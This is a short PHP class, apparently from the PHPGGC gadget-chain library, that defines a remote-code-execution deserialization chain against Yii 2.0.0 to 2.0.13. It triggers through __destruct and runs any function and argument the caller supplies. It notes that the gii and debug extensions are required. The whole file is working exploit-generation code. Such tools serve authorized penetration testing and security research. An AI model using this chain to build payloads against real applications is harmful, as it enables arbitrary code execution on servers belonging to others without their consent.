<?php

namespace GadgetChain\Yii;

class RCE2 extends \PHPGGC\GadgetChain\RCE
{
    public static $version = '2.0.0 <= 2.0.13';
    public static $vector = '__destruct';
    public static $author = 'AFKL';
	public static $informations = '
        This chain requires both gii and debug extensions. (Doesn\'t matter if it\'s on or not.)
    ';

    public function generate(array $parameters)
    {
		$func = $parameters["function"];
		$param = $parameters["parameter"];
		
		return new \yii\db\BatchQueryResult($func, $param);
    }
}